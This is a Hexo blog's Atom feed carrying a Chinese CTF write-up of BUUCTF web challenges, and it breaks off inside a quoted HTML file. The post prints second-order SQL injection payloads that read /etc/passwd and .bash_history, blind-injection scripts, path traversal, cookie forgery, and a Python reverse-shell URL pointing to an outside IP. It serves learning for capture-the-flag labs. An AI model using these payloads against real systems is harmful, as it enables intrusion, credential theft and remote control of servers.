<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>sakura</title>
  
  
  <link href="https://sakurahack-y.github.io/atom.xml" rel="self"/>
  
  <link href="https://sakurahack-y.github.io/"/>
  <updated>2022-04-03T07:23:45.785Z</updated>
  <id>https://sakurahack-y.github.io/</id>
  
  <author>
    <name>sakura</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ctf刷题-第一周题目</title>
    <link href="https://sakurahack-y.github.io/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/"/>
    <id>https://sakurahack-y.github.io/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/</id>
    <published>2022-03-28T12:25:15.000Z</published>
    <updated>2022-04-03T07:23:45.785Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h1><p><strong>Web方向：</strong></p><p>[b01lers2020]Welcome to Earth</p><p>[网鼎杯 2018]Comment</p><p>[GYCTF2020]Ezsqli</p><p>[网鼎杯 2020 白虎组]PicDown</p><p>[watevrCTF-2019]Cookie Store</p><p>[SWPUCTF 2018]SimplePHP</p><p>[WUSTCTF2020]CV Maker</p><p>[HarekazeCTF2019]encode_and_encode</p><p>[红明谷CTF 2021]write_shell</p><p>[SUCTF 2019]EasyWeb</p><p>[RootersCTF2019]I_&lt;3_Flask</p><p>[NCTF2019]SQLi</p><p>[NPUCTF2020]ezinclude</p><p>[CISCN2019 华东南赛区]Double Secret</p><h1 id="刷题"><a href="#刷题" class="headerlink" title="刷题"></a>刷题</h1><h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p>进去后，它会直接提示我，我die了，但是我们可以注意到它有个一闪而过的画面。</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328203228318.png" alt="image-20220328203228318"></p><p>在这个页面没有发现，使用burp抓包</p><p>抓到</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328203639569.png" alt="image-20220328203639569"></p><p>查看源代码，发现了个有趣的路径</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204251360.png" alt="image-20220328204251360"></p><p>继续用burp抓包打开</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204549649.png" alt="image-20220328204549649"></p><p>这两个都点击后，没有效果</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204655545.png" alt="image-20220328204655545"></p><p>查看下源代码，发现一个可疑路径</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204718322.png" alt="image-20220328204718322"></p><p>进入后，界面如下</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204815035.png" alt="image-20220328204815035"></p><p>点击按钮，又会die</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204844208.png" alt="image-20220328204844208"></p><p>继续查看源代码，无限套娃呗</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204931097.png" alt="image-20220328204931097"></p><p>进去</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205009037.png" alt="image-20220328205009037"></p><p>点击continue<br><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205120224.png" alt="image-20220328205120224"></p><p>要选择一个正确的数字，但是太多了吧，先看看源代码吧，发现如下js代码</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205425890.png" alt="image-20220328205425890"></p><p>嘿嘿，不用一个个试了，直接到open目录</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205558332.png" alt="image-20220328205558332"></p><p>继续查看源代码，发现fight目录</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205711090.png" alt="image-20220328205711090"></p><p>进入，一个可怕的外星人</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205745540.png" alt="image-20220328205745540"></p><p>继续查看源代码</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205854907.png" alt="image-20220328205854907"></p><p>发现flag的顺序被打算，想要反解函数不现实，尝试全排列</p><pre><code>itertools.permutations()：就是返回可迭代对象的所有数学全排列方式,它以任意迭代作为参数，并始终返回生成元组的迭代器。它没有(也不应该)特殊的字符串。要获得字符串列表，您可以自己加入元组： list(map(&quot;&quot;.join, itertools.permutations(&#39;1234&#39;)))</code></pre><pre><code class="python">from itertools import permutationsflag = [&quot;&#123;hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!&#125;&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;]item = permutations(flag)for i in item:    #print (i)    k=&quot;&quot;.join(i)    #print(k)    if k.startswith(&#39;pctf&#123;hey_boys&#39;) and k[-1]==&#39;&#125;&#39;:        print(k)</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328215044738.png" alt="image-20220328215044738"></p><p>找到可能的flag，尝试即可</p><p>最终flag为</p><pre><code>pctf&#123;hey_boys_im_baaaaaaaaaack!&#125;</code></pre><h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><p>需要登录才能发帖</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328231641292.png" alt="image-20220328231641292"></p><p>.给了账号和密码前几位，直接burp爆破</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328231742892.png" alt="image-20220328231742892"></p><p>成功爆破出密码</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328231810749.png" alt="image-20220328231810749"></p><p>没发现什么有用的，用dirsearch扫一下目录，注意，由于buu很容易崩溃，要降低速度</p><pre><code>python dirsearch.py -u http://bc06d5bc-c6b1-49d6-b004-e2f130e630ae.node4.buuoj.cn:81/ -e php -t 2 -s 0.2 -o C:\User\Sakura\Desktop\2.txt</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328232440677.png" alt="image-20220328232440677"></p><p>发现git泄露,使用githack扒出源码</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328232710003.png" alt="image-20220328232710003"></p><pre><code class="php">&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#39;login&#39;] != &#39;yes&#39;)&#123;    header(&quot;Location: ./login.php&quot;);    die();&#125;if(isset($_GET[&#39;do&#39;]))&#123;switch ($_GET[&#39;do&#39;])&#123;case &#39;write&#39;:    break;case &#39;comment&#39;:    break;default:    header(&quot;Location: ./index.php&quot;);&#125;&#125;else&#123;    header(&quot;Location: ./index.php&quot;);&#125;?&gt;</code></pre><p>但是这段代码明显不完整</p><p>使用(这里推荐使用linux，我用windows出现了错误)</p><pre><code>git log --all</code></pre><p>查一下之前提交的版本</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329000637723.png" alt="image-20220329000637723"></p><p>恢复到初始版本</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329000916068.png" alt="image-20220329000916068"></p><p>成功得到完整源码</p><pre><code class="php">&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#39;login&#39;] != &#39;yes&#39;)&#123;    header(&quot;Location: ./login.php&quot;);    die();&#125;if(isset($_GET[&#39;do&#39;]))&#123;switch ($_GET[&#39;do&#39;])&#123;case &#39;write&#39;:    $category = addslashes($_POST[&#39;category&#39;]);    $title = addslashes($_POST[&#39;title&#39;]);    $content = addslashes($_POST[&#39;content&#39;]);    $sql = &quot;insert into board            set category = &#39;$category&#39;,                title = &#39;$title&#39;,                content = &#39;$content&#39;&quot;;    $result = mysql_query($sql);    header(&quot;Location: ./index.php&quot;);    break;case &#39;comment&#39;:    $bo_id = addslashes($_POST[&#39;bo_id&#39;]);    $sql = &quot;select category from board where id=&#39;$bo_id&#39;&quot;;    $result = mysql_query($sql);    $num = mysql_num_rows($result);    if($num&gt;0)&#123;    $category = mysql_fetch_array($result)[&#39;category&#39;];    $content = addslashes($_POST[&#39;content&#39;]);    $sql = &quot;insert into comment            set category = &#39;$category&#39;,                content = &#39;$content&#39;,                bo_id = &#39;$bo_id&#39;&quot;;    $result = mysql_query($sql);    &#125;    header(&quot;Location: ./comment.php?id=$bo_id&quot;);    break;default:    header(&quot;Location: ./index.php&quot;);&#125;&#125;else&#123;    header(&quot;Location: ./index.php&quot;);&#125;?&gt;</code></pre><p>开始审计代码</p><p>先介绍下addslashes函数</p><pre><code>addslashes() 函数在指定的预定义字符前添加反斜杠。这些字符是单引号（&#39;）、双引号（&quot;）、反斜线（\）与NUL（NULL字符）。</code></pre><p>逻辑其实很清晰</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329003323533.png" alt="image-20220329003323533"></p><p>当我们访问一个页面，取出这个页面中category的值然后接受content的值，插入到该页面。但是问题就出在，此代码只对用户输入的值做了转义，而绝对信任从服务器中取出的值，这就导致了二次注入。所以我们要想办法闭合sql语句，使其可以执行我们恶意的sql语句。</p><p>所以我们要对发帖处的categories做特殊输入</p><pre><code>0&#39;,content = database(), /*</code></pre><p>然后在留言处输入</p><pre><code>*/#</code></pre><p>这时候的sql语句就变为</p><pre><code>$sql = &quot;insert into comment        set category = &#39;0&#39;,content = &#39;database()&#39;/*&#39;,        content = &#39;*/#&#39;,        bo_id = &#39;$bo_id&#39;&quot;;</code></pre><p>简化后</p><pre><code>$sql = &quot;insert into comment set category = &#39;0&#39;,content = &#39;database()&#39;,bo_id = &#39;$bo_id&#39;&quot;;</code></pre><p>这样通过在category构造，可以把content替换成我们想要的语句</p><p>我们来看一下执行效果</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005247027.png" alt="image-20220329005247027"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005310132.png" alt="image-20220329005310132"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005321316.png" alt="image-20220329005321316"></p><p>成功爆出了数据库</p><p>查看一下权限</p><pre><code>0&#39;,content = user(), /*</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005602357.png" alt="image-20220329005602357"></p><p>最高权限，可以尝试load_file()读取文件</p><pre><code>0&#39;,content = load_file(&#39;/etc/passwd&#39;), /*</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005942676.png" alt="image-20220329005942676"></p><p>我们发现www用户(一般和网站操作相关的用户，由中间件创建)在/home/www目录,读取这下面的.bash_history文件</p><pre><code>每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件，保存了当前用户使用过的历史命令，方便查找。</code></pre><pre><code>0&#39;,content = load_file(&#39;/home/www/.bash_history&#39;), /*</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329010244317.png" alt="image-20220329010244317"></p><p>我们可以看到它解压了一个html.zip，删除html.zip,然后整个文件夹复制到/var/www/html里，然后删除.DS_Store</p><pre><code>.DS_Store(英文全称 Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存贮目录的自定义属性，例如文件们的图标位置或者是背景色的选择。通过.DS_Store可以知道这个目录里面所有文件的清单。</code></pre><p>它还有一份存在于在/tmp//html/目录中，构造sql语句进行读取</p><pre><code>0&#39;,content = load_file(&#39;/tmp/html/.DS_Store&#39;), /*</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329010811271.png" alt="image-20220329010811271"></p><p>这里文件太多，无法完全显示，进行十六进制转换</p><pre><code>0&#39;,content = hex(load_file(&#39;/tmp/html/.DS_Store&#39;)), /*</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329011204300.png" alt="image-20220329011204300"></p><p>解码</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329013046184.png" alt="image-20220329013046184"></p><p>发现可疑文件</p><pre><code>flag_8946e1ff1ee3e40f.php</code></pre><p>构造sql语句进行读取</p><pre><code>0&#39;,content = load_file(&#39;/var/www/html/flag_8946e1ff1ee3e40f.php&#39;), /*</code></pre><p>这里有个坑，/tmp/html/flag_8946e1ff1ee3e40f.php的flag是假flag，还是要当当前运行的网站目录下读取</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329013441800.png" alt="image-20220329013441800"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329013451988.png" alt="image-20220329013451988"></p><h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>考察sql注入</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329161851618.png" alt="image-20220329161851618"></p><p>测试一下</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329161953080.png" alt="image-20220329161953080"></p><p>有waf，fuzz一下</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329162032033.png" alt="image-20220329162032033"></p><p>发现很多关键词被过滤了</p><p>考虑盲注，测试一下</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329162428599.png" alt="image-20220329162428599"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329162354207.png" alt="image-20220329162354207"></p><p>确认了盲注的存在</p><pre><code>为什么加上||1=1后，值会变为Nu1L后呢，这里牵扯到运算顺序，这是我之前百思不得其解的一点，后门才想起来</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329162630562.png" alt="image-20220329162630562"></p><p>我们可以看到比较运算的优先级是高于or的，所以会先判断右边的值是否为真，如果为真就不会再看左边了。</p><p>总之我们确定了要从盲注入手，但还有一个关键点，那就是information这个表被禁用，我们需要从其他表中获取我们需要的内容。</p><p><strong>1.利用mysql5.7新增的sys.schema_auto_increment_columns</strong></p><pre><code> 这是sys数据库下的一个视图，基础数据来自与information_schema,他的作用是对表的自增ID进行监控，也就是说，如果某张表存在自增ID，就可以通过该视图来获取其表名和所在数据库名以下为该视图的所有列</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/20201019141522482.png" alt="img"></p><p><strong>2.sys.schema_table_statistics_with_buffer</strong></p><pre><code> 这是sys数据库下的视图，里面存储着所有数据库所有表的统计信息  与它表结构相似的视图还有  sys.x$schema_table_statistics_with_buffer  sys.x$schema_table_statistics  sys.x$ps_schema_table_statistics_io以下为该视图的常用列（全部列有很多很多)</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/20201019141702221.png" alt="img"></p><p><strong>3.mysql默认存储引擎innoDB携带的表</strong></p><pre><code>  mysql.innodb_table_stats  mysql.innodb_index_stats  两表均有database_name和table_name字段，可以利用</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/20201019141811114.png" alt="img"></p><p>盲注需要用二进制跑才能提高效率，贴上写的盲注脚本，我太菜了写一个要半天时间</p><pre><code class="python">import timeimport requestsurl = &quot;http://f7bc77b0-cab8-4b62-a524-0b593aa80d8b.node4.buuoj.cn:81/index.php&quot;i = 0result = &#39;&#39;for i in range(1,2000):    min = 32    max = 128    mid = (min + max) // 2    while min &lt; max:        payload = &quot;1^(ascii(substr((select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema)=database()),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i, mid)        print(payload)        data = &#123;            &quot;id&quot;: payload        &#125;        res = requests.post(url, data)        if &quot;Error&quot; in res.text:            min = mid + 1        else:            max = mid        mid = (min + max) // 2    result += chr(int(mid))    print(result)    time.sleep(0.5)</code></pre><p>最好的办法是背下来模板，这样真正的比赛时才能较快写题。</p><p>最终得到两个表</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329180202611.png" alt="image-20220329180202611"></p><p>接下来就要从表中拿flag</p><p>下面要用到<strong>无列名注入</strong></p><p>为什么要采用这个注入呢，是因为sys.schema_table_statistics_with_buffer中只有表的信息，并没有列的信息，因此无法使用常规的方法。</p><p>关于无列名注入，首先我们来看一个例子</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329211549667.png" alt="image-20220329211549667"></p><p>这代表字符串的大小于长短无关，而与首字母(如果首字母相同则继续向下比大小)的ascii有关</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329211742422.png" alt="image-20220329211742422"></p><p>由这个我们就能构造出payload</p><p>先来判断下字段</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329213941106.png" alt="image-20220329213941106"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329213956411.png" alt="image-20220329213956411"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329214035443.png" alt="image-20220329214035443"></p><p>由此可判断字段为两个</p><p>payload</p><pre><code>id=1||((select 1,&#123;0&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh))</code></pre><p>代码:</p><p>暴力</p><pre><code class="python">import timeimport requestsurl = &quot;http://f7bc77b0-cab8-4b62-a524-0b593aa80d8b.node4.buuoj.cn:81/index.php&quot;value = &#39;&#39;def get_flag(char,value):    return value+charfor m in range(1,2000):    for i in range(32,128):        payload = &#39;2||((select 1,&quot;&#123;&#125;&quot;))&gt;(select * from f1ag_1s_h3r3_hhhhh)&#39;.format(get_flag(chr(i), value))        print(payload)        data = &#123;            &quot;id&quot;: payload        &#125;        res = requests.post(url, data)        time.sleep(0.5)        if &quot;Nu1L&quot; in res.text:            value += chr(i-1)            print(value)            break</code></pre><h2 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h2><p><strong>非预期解</strong></p><p>这题做的很奇妙，，，直接非预期解了</p><pre><code>e55bfc7a-1b58-4018-8545-2c34946638fc.node4.buuoj.cn:81/page?url=../../../../flag</code></pre><p>得到一个图片，拖到010editor，flag直接出现</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330004918193.png" alt="image-20220330004918193"></p><p><strong>预期解</strong></p><p>还是学习下正规思路吧</p><p>首先应该读取下进程信息</p><pre><code>在/proc 文件系统中，每一个进程都有一个相应的文件  。下面是/proc 目录下的一些重要文件  ：/proc/pid/cmdline  包含了用于开始进程的命令  ；/proc/pid/cwd 包含了当前进程工作目录的一个链接  ；/proc/pid/environ  包含了可用进程环境变量的列表  ；/proc/pid/exe  包含了正在进程中运行的程序链接；/proc/pid/fd/  这个目录包含了进程打开的每一个文件的链接；/proc/pid/mem  包含了进程在内存中的内容；/proc/pid/stat 包含了进程的状态信息；/proc/pid/statm  包含了进程的内存使用信息。 </code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330010223445.png" alt="image-20220330010223445"></p><p>可以看到刚开始执行了</p><pre><code>python2 app.py</code></pre><p>我们来读取下app.py的源码</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330010349857.png" alt="image-20220330010349857"></p><pre><code class="python">from flask import Flask, Responsefrom flask import render_templatefrom flask import requestimport osimport urllibapp = Flask(__name__)SECRET_FILE = &quot;/tmp/secret.txt&quot;f = open(SECRET_FILE)SECRET_KEY = f.read().strip()os.remove(SECRET_FILE)@app.route(&#39;/&#39;)def index():    return render_template(&#39;search.html&#39;)@app.route(&#39;/page&#39;)def page():    url = request.args.get(&quot;url&quot;)    try:        if not url.lower().startswith(&quot;file&quot;):            res = urllib.urlopen(url)            value = res.read()            response = Response(value, mimetype=&#39;application/octet-stream&#39;)            response.headers[&#39;Content-Disposition&#39;] = &#39;attachment; filename=beautiful.jpg&#39;            return response        else:            value = &quot;HACK ERROR!&quot;    except:        value = &quot;SOMETHING WRONG!&quot;    return render_template(&#39;search.html&#39;, res=value)@app.route(&#39;/no_one_know_the_manager&#39;)def manager():    key = request.args.get(&quot;key&quot;)    print(SECRET_KEY)    if key == SECRET_KEY:        shell = request.args.get(&quot;shell&quot;)        os.system(shell)        res = &quot;ok&quot;    else:        res = &quot;Wrong Key!&quot;    return resif __name__ == &#39;__main__&#39;:    app.run(host=&#39;0.0.0.0&#39;, port=8080)</code></pre><p>linux里如果没有关闭文件会放在内存里，就算你remove掉了<strong>在/proc/[pid]/fd下还是会保存</strong></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330012552404.png" alt="image-20220330012552404"></p><p>找到了密钥</p><pre><code>8KI7ZjeLAu178g1JBR9DcCwNsnWdY64XmDWv/PH5qe0=</code></pre><p>结果是无回显rce</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330012910567.png" alt="image-20220330012910567"></p><p>使用反弹shell</p><pre><code>http://e55bfc7a-1b58-4018-8545-2c34946638fc.node4.buuoj.cn:81/no_one_know_the_manager?key=8KI7ZjeLAu178g1JBR9DcCwNsnWdY64XmDWv/PH5qe0=&amp;shell=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22108.166.201.16%22,3333));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)%27</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330014147414.png" alt="image-20220330014147414"></p><h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>这题很简单，进去后我们只有50元但是有一个100元的曲奇</p><p>猜测购买这个曲奇获得flag</p><p>点击购买并抓包</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330164344642.png" alt="image-20220330164344642"></p><p>seesion很像base64加密</p><p>解密一下</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330164431797.png" alt="image-20220330164431797"></p><p>修改下money然后再base64加密</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330164507027.png" alt="image-20220330164507027"></p><p>购买100元的曲奇，替换原有的cookie</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330164535408.png" alt="image-20220330164535408"></p><p>成功获得flag</p><h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>点击查看文件</p><pre><code>http://2895a638-1834-4f93-8e10-962056e63a83.node4.buuoj.cn:81/file.php?file=</code></pre><p>观察url，很可能是文件包含，读取下各个文件源码</p><p>index.php</p><pre><code class="php">&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;);  include &#39;base.php&#39;;?&gt; </code></pre><p>base.php</p><pre><code class="php">&lt;?php     session_start(); ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt;     &lt;meta charset=&quot;utf-8&quot;&gt;     &lt;title&gt;web3&lt;/title&gt;     &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;&gt;     &lt;script src=&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt;     &lt;script src=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt;     &lt;nav class=&quot;navbar navbar-default&quot; role=&quot;navigation&quot;&gt;         &lt;div class=&quot;container-fluid&quot;&gt;         &lt;div class=&quot;navbar-header&quot;&gt;             &lt;a class=&quot;navbar-brand&quot; 